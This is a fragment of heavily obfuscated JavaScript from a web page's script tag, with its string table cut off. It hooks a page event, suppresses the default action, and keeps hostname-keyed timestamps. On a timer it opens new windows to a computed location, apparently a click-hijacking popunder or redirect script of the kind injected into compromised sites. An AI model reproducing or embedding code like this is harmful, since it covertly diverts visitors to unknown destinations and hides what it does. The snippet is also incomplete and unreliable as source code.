Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>